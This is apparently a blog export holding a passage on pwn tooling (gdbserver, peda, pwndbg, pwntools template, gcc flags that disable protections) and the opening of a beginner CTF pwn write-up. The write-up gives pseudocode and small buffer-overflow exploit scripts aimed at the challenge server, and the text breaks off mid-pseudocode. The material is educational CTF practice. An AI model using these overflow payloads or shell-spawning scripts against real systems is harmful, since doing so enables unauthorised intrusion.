<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> gdb/</span><br><span class="line">$ ./configure --target=arm-linux --program-prefix=arm-linux- --prefix=/opt/arm-linux-gdb/</span><br><span class="line">$ make <span class="comment"># build gdb</span></span><br><span class="line">$ make install <span class="comment"># install gdb</span></span><br><span class="line"><span class="comment"># if error occurs, google to solve it</span></span><br><span class="line">$ <span class="built_in">cd</span> gdb/gdbserver/</span><br><span class="line">$ ./configure --target=arm-linux --host=arm-linux-gnueabi</span><br><span class="line"><span class="comment"># &#x27;--host&#x27; assigns cross compilation toolchain</span></span><br><span class="line">$ make <span class="comment"># build gdbserver</span></span><br></pre></td></tr></table></figure>
<p>Allow program to be debugged</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ arm-linux-gnueabi-gcc -g test.c -o <span class="built_in">test</span></span><br><span class="line"><span class="comment"># &#x27;-g&#x27; is essential</span></span><br></pre></td></tr></table></figure>
<p>Copy gdbserver to target machine, and run it</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ gdbserver IP:PORT xxx [--attach PID]</span><br><span class="line"><span class="comment"># this IP is your host IP</span></span><br></pre></td></tr></table></figure>
<p>At your host</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ arm-linux-gdb xxx</span><br><span class="line">......</span><br><span class="line">(gdb) target remote IP:PORT</span><br><span class="line"><span class="comment"># this IP is your target IP</span></span><br></pre></td></tr></table></figure>
<h3 id="peda"><a href="#peda" class="headerlink" title="peda"></a><a class="link"   href="https://github.com/longld/peda" >peda<i class="fas fa-external-link-alt"></i></a></h3><p><a class="link"   href="https://github.com/longld/peda" >PEDA<i class="fas fa-external-link-alt"></i></a> - Python Exploit Development Assistance for GDB<br>Key Features:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Enhance the display of gdb: colorize and display disassembly codes, registers, memory information during debugging.</span><br><span class="line">Add commands to support debugging and exploit development (for a full list of commands use peda help):</span><br><span class="line">    aslr -- Show/set ASLR setting of GDB</span><br><span class="line">    checksec -- Check for various security options of binary</span><br><span class="line">    dumpargs -- Display arguments passed to a function when stopped at a call instruction</span><br><span class="line">    dumprop -- Dump all ROP gadgets in specific memory range</span><br><span class="line">    elfheader -- Get headers information from debugged ELF file</span><br><span class="line">    elfsymbol -- Get non-debugging symbol information from an ELF file</span><br><span class="line">    lookup -- Search for all addresses/references to addresses which belong to a memory range</span><br><span class="line">    patch -- Patch memory start at an address with string/hexstring/int</span><br><span class="line">    pattern -- Generate, search, or write a cyclic pattern to memory</span><br><span class="line">    procinfo -- Display various info from /proc/pid/</span><br><span class="line">    pshow -- Show various PEDA options and other settings</span><br><span class="line">    pset -- Set various PEDA options and other settings</span><br><span class="line">    readelf -- Get headers information from an ELF file</span><br><span class="line">    ropgadget -- Get common ROP gadgets of binary or library</span><br><span class="line">    ropsearch -- Search for ROP gadgets in memory</span><br><span class="line">    searchmem|find -- Search for a pattern in memory; support regex search</span><br><span class="line">    shellcode -- Generate or download common shellcodes.</span><br><span class="line">    skeleton -- Generate python exploit code template</span><br><span class="line">    vmmap -- Get virtual mapping address ranges of section(s) in debugged process</span><br><span class="line">    xormem -- XOR a memory region with a key</span><br></pre></td></tr></table></figure>
<p>Installation</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/longld/peda.git ~/peda</span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;source ~/peda/peda.py&quot;</span> &gt;&gt; ~/.gdbinit   <span class="comment"># if using pwndbg, gef or other plugins, just change contents in ~/.gdbinit</span></span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;DONE! debug your program with gdb and enjoy&quot;</span></span><br></pre></td></tr></table></figure>
<p>Other plugins include: <a href="https://github.com/pwndbg/pwndbg"><code>pwndbg</code></a>, <a href="https://github.com/hugsy/gef"><code>gef</code></a>, you can also write one by yourself.</p>
<h3 id="pwndbg"><a href="#pwndbg" class="headerlink" title="pwndbg"></a><a class="link"   href="https://github.com/pwndbg/pwndbg" >pwndbg<i class="fas fa-external-link-alt"></i></a></h3><p>It is <a class="link"   href="https://github.com/pwndbg/pwndbg" >pwndbg<i class="fas fa-external-link-alt"></i></a>, not <a class="link"   href="https://github.com/scwuaptx/Pwngdb" >Pwngdb<i class="fas fa-external-link-alt"></i></a>.</p>
<p>Comparing to <code>gef</code>, both <code>peda</code> and <code>pwndbg</code> are better for heap analysis.</p>
<p>Installation</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ git clone https://github.com/pwndbg/pwndbg</span><br><span class="line">$ cd pwndbg</span><br><span class="line">$ ./setup.sh</span><br></pre></td></tr></table></figure>
<p>Useful commands:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">heap</span><br><span class="line">bins</span><br><span class="line">arena</span><br><span class="line">context</span><br><span class="line">retaddr</span><br><span class="line">checksec</span><br><span class="line">cyclic</span><br><span class="line">hexdump [addr]</span><br><span class="line">search --[writable|executable] --[qword|string] [0x1/bin/sh]</span><br><span class="line">dump memory copy start_addr end_addr</span><br><span class="line">bd/be n -- disable/enable breakpoint n (`info b` to see)</span><br><span class="line">aslr [blank/on/off]</span><br></pre></td></tr></table></figure>

<h2 id="GCC"><a href="#GCC" class="headerlink" title="GCC"></a>GCC</h2><p>e.g.: </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ gcc -fno-stack-protector -z execstack -no-pie -mpreferred-stack-boundary=4 -o pwn1 pwn1.c</span><br></pre></td></tr></table></figure>
<p>remove canary, NX, PIE, and What a stack boundary&#x3D;2&#x2F;4 does<br> is to ensure that the stack is set up into dword-size&#x2F;qword-size increments,<br> this prevents your machine from optimizing the stack.</p>
<p>Compile shared library:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ gcc -shared -fPIC -0 libx.so libx.c</span><br><span class="line"># $ LD_PRELOAD=./libx.so ./pwn2</span><br></pre></td></tr></table></figure>
<h2 id="strace-ltrace-ftrace-ptrace"><a href="#strace-ltrace-ftrace-ptrace" class="headerlink" title="strace, ltrace, ftrace, ptrace"></a>strace, ltrace, ftrace, ptrace</h2><p>They are used to tracking system calls and signals for user space processes</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ strace ./cpptest </span><br><span class="line">execve(&quot;./cpptest&quot;, [&quot;./cpptest&quot;], 0x7fffcd553000 /* 46 vars */) = 0</span><br><span class="line">brk(NULL)                               = 0x55ac0a57c000</span><br><span class="line">access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)</span><br><span class="line">...</span><br><span class="line">write(1, &quot;Hello world!\n&quot;, 13Hello world!</span><br><span class="line">)          = 13</span><br><span class="line">exit_group(0)                           = ?</span><br><span class="line">+++ exited with 0 +++</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>show details and exit code</p>
<h2 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h2><p>Cannot function on Windows because quite a few modules are Linux only</p>
<p>Install in python2</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ pip install pwntools</span><br></pre></td></tr></table></figure>

<p>Install in python3</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ pip3 install git+https://github.com/arthaud/python3-pwntools.git</span><br></pre></td></tr></table></figure>

<p>Here is <a class="link"   href="http://docs.pwntools.com/en/stable/" >pwntools official docs<i class="fas fa-external-link-alt"></i></a>. Better deploy it at localhost to avoid network delay</p>
<p>Along with <code>pwn</code> Python library, we have other gadgets installed like: <code>ROPgadget</code>, <code>cyclic</code>, <code>checksec</code> and</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ pwn</span><br><span class="line">usage: pwn [-h]</span><br><span class="line">           &#123;asm,checksec,constgrep,cyclic,debug,disasm,disablenx,elfdiff,elfpatch,errno,hex,phd,pwnstrip,scramble,shellcraft,template,unhex,update&#125;</span><br></pre></td></tr></table></figure>
<p>Template:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># arch in [&#x27;aarch64&#x27;, &#x27;alpha&#x27;, &#x27;amd64&#x27;, &#x27;arm&#x27;, &#x27;avr&#x27;, &#x27;cris&#x27;, &#x27;i386&#x27;, &#x27;ia64&#x27;, &#x27;m68k&#x27;, &#x27;mips&#x27;, &#x27;mips64&#x27;, &#x27;msp430&#x27;, &#x27;none&#x27;, &#x27;powerpc&#x27;, &#x27;powerpc64&#x27;, &#x27;s390&#x27;, &#x27;sparc&#x27;, &#x27;sparc64&#x27;, &#x27;thumb&#x27;, &#x27;vax&#x27;]</span></span><br><span class="line"><span class="comment"># os in [&#x27;android&#x27;, &#x27;cgc&#x27;, &#x27;freebsd&#x27;, &#x27;linux&#x27;, &#x27;windows&#x27;]</span></span><br><span class="line"><span class="comment"># log_level in [&#x27;CRITICAL&#x27;, &#x27;DEBUG&#x27;, &#x27;ERROR&#x27;, &#x27;INFO&#x27;, &#x27;NOTSET&#x27;, &#x27;WARN&#x27;, &#x27;WARNING&#x27;]</span></span><br><span class="line">sh = process(<span class="string">&#x27;file&#x27;</span>, level=<span class="string">&#x27;debug&#x27;</span>) </span><br><span class="line"><span class="comment"># sh = remote(&#x27;ip&#x27;,port)</span></span><br><span class="line"></span><br><span class="line">shelf = ELF(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">libcelf = ELF(<span class="string">&#x27;xxx.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shell_addr = <span class="number">0xdeadbeef</span></span><br><span class="line"><span class="built_in">print</span> sh.recv() <span class="comment"># recvuntil, recvline, ...</span></span><br><span class="line">sh.sendline(p64(shell_addr)) <span class="comment"># send, sendafter, ...</span></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>About <code>gdb</code> debug, you can attach in script:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>] <span class="comment"># need to run &#x27;tmux&#x27; first</span></span><br><span class="line">gdb.attach(sh)</span><br></pre></td></tr></table></figure>
<p>or print <code>pid</code> in script and attach in another terminal:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># in python2</span></span><br><span class="line"><span class="built_in">print</span> pidof(sh)</span><br><span class="line"><span class="comment"># get: [pid]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># in term</span></span><br><span class="line">$ gdb -q</span><br><span class="line">(gdb) attach [pid]</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>When running program you can add parameters:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">sh = process(<span class="string">&#x27;file&#x27;</span>, level=<span class="string">&#x27;info&#x27;</span>, aslr=<span class="string">&#x27;True&#x27;</span>)</span><br><span class="line"><span class="comment"># &#x27;level&#x27; is like &#x27;log_level&#x27;</span></span><br><span class="line"><span class="comment"># if &#x27;aslr&#x27; is &#x27;False&#x27;, program will have a fixed base address  </span></span><br></pre></td></tr></table></figure>
<p>And other functions</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pause()     </span><br><span class="line">cyclic() and cyclic_find()</span><br><span class="line">struct.pack/unpack()</span><br><span class="line">ljust/rjust()</span><br><span class="line">\xcc: SIGTRAP</span><br></pre></td></tr></table></figure>
<h2 id="other-commands"><a href="#other-commands" class="headerlink" title="other commands"></a>other commands</h2><p>file xxx    to recognize file type by magic bytes</p>
<p>checksec xxx   to see protection</p>
<p>ldd xxx     to show share library</p>
<p>strings [-n16] [-el&#x2F;eb] -tx&#x2F;to&#x2F;td xxx     to show strings</p>
<p>hexdump -C xxx    to see hex</p>
<p>fdisk -l xxx   to see disk</p>
<p>dd if&#x3D;xxx of&#x3D;xxx  to extract from firmware </p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>linux</tag>
        <tag>gdb</tag>
        <tag>binutils</tag>
        <tag>pwntools</tag>
      </tags>
  </entry>
  <entry>
    <title>ADWorld PWN Exercise Area Write-ups</title>
    <url>/2020/07/24/2020-07-24-ADWorld-PWN-Exercise-Area-Write-ups/</url>
    <content><![CDATA[<p>You can find all the following challenges on <a class="link"   href="https://adworld.xctf.org.cn/task/task_list?type=pwn&number=2&grade=0" >World of Attack &amp; Defense (ADWorld)<i class="fas fa-external-link-alt"></i></a>, which is a CN CTF platform and not so international (All Chinese challenge descriptions). </p>
<p>Just follow my lead to deal with these problems, I get you en descriptions.</p>
<h1 id="Basic-Part"><a href="#Basic-Part" class="headerlink" title="Basic Part"></a>Basic Part</h1><p>Exercise area includes some basic challenges.</p>
<h2 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h2><p>Attachment: <a href="/filehost/apeaw/get_shell">get_shell</a><br>Description: You can get the shell by running it, really.</p>
<p>First check this file:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ file get_shell</span><br><span class="line">get_shell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=6334e8ad1474b290bdb69d75a1b44ed029669888, not stripped</span><br><span class="line">$ checksec get_shell</span><br><span class="line">[*] <span class="string">&#x27;/root/get_shell&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<p>Use IDA Pro (with Hex-Rays) to see pseudocode:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;OK,this time we will get a shell.&quot;</span>);</span><br><span class="line">  <span class="built_in">system</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>It is a warm up to let you know how to solve tasks. There’re 3 ways:</p>
<ol>
<li>Run it locally, know how it works and test exploit script.  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ./get_shell</span><br><span class="line">OK,this time we will get a shell.</span><br><span class="line"># ls</span><br><span class="line">CGfsb  cgpwn2  get_shell  guess_num  hello_pwn  int_overflow  level0  level2  level3.gz  string  when_did_u_born</span><br><span class="line"># id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line"># uname</span><br><span class="line">Linux</span><br></pre></td></tr></table></figure></li>
<li>Use <code>netcat</code> to connect and do normal interaction.<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">nc 220.249.52.133 50247</span><br><span class="line">ls -al</span><br><span class="line">total 56</span><br><span class="line">drwxr-x--- 1 0 1000 4096 Oct  4  2018 .</span><br><span class="line">drwxr-x--- 1 0 1000 4096 Oct  4  2018 ..</span><br><span class="line">-rwxr-x--- 1 0 1000  220 Aug 31  2015 .bash_logout</span><br><span class="line">-rwxr-x--- 1 0 1000 3771 Aug 31  2015 .bashrc</span><br><span class="line">-rwxr-x--- 1 0 1000    0 Sep 28  2018 .gitkeep</span><br><span class="line">-rwxr-x--- 1 0 1000  655 May 16  2017 .profile</span><br><span class="line">drwxr-x--- 1 0 1000 4096 Oct  4  2018 bin</span><br><span class="line">drwxr-x--- 1 0 1000 4096 Oct  4  2018 dev</span><br><span class="line">-rwxr----- 1 0 1000   45 Jul 25 03:15 flag</span><br><span class="line">-rwxr-x--- 1 0 1000 8656 Sep 28  2018 get_shell</span><br><span class="line">drwxr-x--- 1 0 1000 4096 Oct  4  2018 lib</span><br><span class="line">drwxr-x--- 1 0 1000 4096 Oct  4  2018 lib32</span><br><span class="line">drwxr-x--- 1 0 1000 4096 Oct  4  2018 lib64</span><br></pre></td></tr></table></figure></li>
<li>Use <code>pwntools</code> to do anvanced interaction and write script.<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">$ cat get_shell.py</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#sh = process(&#x27;./get_shell&#x27;)</span></span><br><span class="line">sh = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">55822</span>)</span><br><span class="line">sh.interactive()</span><br><span class="line">$ python get_shell.py</span><br><span class="line">[+] Opening connection to <span class="number">220.249</span><span class="number">.52</span><span class="number">.133</span> on port <span class="number">55822</span>: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ ls</span><br><span class="line"><span class="built_in">bin</span></span><br><span class="line">dev</span><br><span class="line">flag</span><br><span class="line">get_shell</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">$ cat flag</span><br></pre></td></tr></table></figure>
<h2 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello pwn"></a>hello pwn</h2>Attachment: <a href="/filehost/apeaw/hello_pwn">hello_pwn</a><br>Description: pwn! Segment fault! Caiji fell into deep thought.</li>
</ol>
<p>Check:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ file hello_pwn</span><br><span class="line">hello_pwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=05ef7ecf06e02e7f199b11c4647880e8379e6ce0, stripped</span><br><span class="line">$ checksec hello_pwn</span><br><span class="line">[*] <span class="string">&#x27;/root/hello_pwn&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<p>Pseudocode:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">--------------------------------- <span class="function">main</span></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">alarm</span>(<span class="number">0x3C</span>u);</span><br><span class="line">  <span class="built_in">setbuf</span>(stdout, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;~~ welcome to ctf ~~     &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;lets get helloworld for bof&quot;</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;unk_601068, <span class="number">0x10</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( dword_60106C == <span class="number">1853186401</span> )</span><br><span class="line">    <span class="built_in">sub_400686</span>(<span class="number">0LL</span>, &amp;unk_601068);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line">--------------------------------- <span class="function"><span class="keyword">and</span> sub_400686</span></span><br><span class="line"><span class="function">__int64 <span class="title">sub_400686</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">system</span>(<span class="string">&quot;cat flag.txt&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Our goal is <code>sub_400686()</code>. We can write to <code>unk_601068</code>, and <code>dword_60106C</code> is used in <code>if</code> statement. The number <code>1853186401</code> is equal to <code>0x6E756161</code>, or <code>nuaa</code>.<br>We need to let <code>if</code> be true. </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.bss:0000000000601068 unk_601068      db    ? ;               ; DATA XREF: main+3B↑o</span><br><span class="line">.bss:0000000000601069                 db    ? ;</span><br><span class="line">.bss:000000000060106A                 db    ? ;</span><br><span class="line">.bss:000000000060106B                 db    ? ;</span><br><span class="line">.bss:000000000060106C dword_60106C    dd ?                    ; DATA XREF: main+4A↑r</span><br></pre></td></tr></table></figure>
<p>The <code>unk_601068</code> can only save 4 chars, but it reads <code>0x10uLL</code> bytes (more than 4 chars).<br>So we get our first buffer overflow. Since the 5th char, our input will overwrite <code>unk_601068</code>, so we can control the value by enter <code>aaaaqwer</code> to set it as <code>rewq</code> (inverted because of little-endian).</p>
<p>So we send <code>aaaaaaun</code> to set <code>unk_601068</code> as <code>nuaa</code>.</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># nc</span></span><br><span class="line"><span class="built_in">echo</span> aaaaaaun | nc x.x.x.x xxx</span><br><span class="line"><span class="comment"># pwntools</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;aaaaaaun&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h2 id="When-did-you-born"><a href="#When-did-you-born" class="headerlink" title="When did you born"></a>When did you born</h2><p>Attachment: <a href="/filehost/apeaw/when_did_u_born">when_did_u_born</a><br>Description: As long as you know your age, you can get the flag, but Caiji finds that the input is incorrect anyway, what should I do?</p>
<p>Check:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ file when_did_u_born</span><br><span class="line">when_did_u_born: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=718185b5ec9c26eb9aeccfa0ab53678e34fee00a, stripped</span><br><span class="line">$ checksec when_did_u_born</span><br><span class="line">[*] <span class="string">&#x27;/root/when_did_u_born&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<p>Pseudocode:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">setbuf</span>(stdin, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">setbuf</span>(stdout, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">setbuf</span>(stderr, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What&#x27;s Your Birth?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v5);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="built_in">getchar</span>() != <span class="number">10</span> )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( v5 == <span class="number">1926</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You Cannot Born In 1926!&quot;</span>);</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;What&#x27;s Your Name?&quot;</span>);</span><br><span class="line">    <span class="built_in">gets</span>(&amp;v4);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You Are Born In %d\n&quot;</span>, v5);</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="number">1926</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;You Shall Have Flag.&quot;</span>);</span><br><span class="line">      <span class="built_in">system</span>(<span class="string">&quot;cat flag&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;You Are Naive.&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;You Speed One Second Here.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Here we need to exploit by using stack overflow, because <code>v4</code> and <code>v5</code> are both on the stack, and we have to overwrite <code>v5</code> as <code>1926</code> by writing to <code>v4</code> in the second input.</p>
<pre><code>char v4; // [rsp+0h] [rbp-20h]
unsigned int v5; // [rsp+8h] [rbp-18h]
</code></pre>
<p>The offset seems to be <code>20h-18h</code> &#x3D;&#x3D; <code>8</code> &#x2F; <code>8h-0h</code> &#x3D;&#x3D; <code>8</code> , so the exploit should be:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./when_did_u_born&#x27;</span>)</span><br><span class="line">sh = remote(<span class="string">&quot;220.249.52.133&quot;</span>,<span class="number">56474</span>)</span><br><span class="line">sh.recv() <span class="comment"># What&#x27;s Your Birth?</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sh.recv() <span class="comment"># What&#x27;s Your Name?</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> + p64(<span class="number">1926</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="guess-num"><a href="#guess-num" class="headerlink" title="guess num"></a>guess num</h2><p>Attachment: <a href="/filehost/apeaw/guess_num">guess_num</a><br>Description: Caiji is playing a game of guessing numbers, but he can’t win anyway, can you help him?</p>
<p>Check:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ file guess_num</span><br><span class="line">guess_num: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=c5689a0b4458c068fb51e3a2c167b112c3ba7323, stripped</span><br><span class="line">$ checksec guess_num</span><br><span class="line">[*] <span class="string">&#x27;/root/guess_num&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<p>Pseudocode:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE *v3; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v4; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+4h] [rbp-3Ch]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> seed[<span class="number">2</span>]; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v11; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v11 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">setbuf</span>(stdin, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">setbuf</span>(stdout, <span class="number">0LL</span>);</span><br><span class="line">  v3 = stderr;</span><br><span class="line">  <span class="built_in">setbuf</span>(stderr, <span class="number">0LL</span>);</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  *(_QWORD *)seed = <span class="built_in">sub_BB0</span>(v3, <span class="number">0LL</span>);</span><br><span 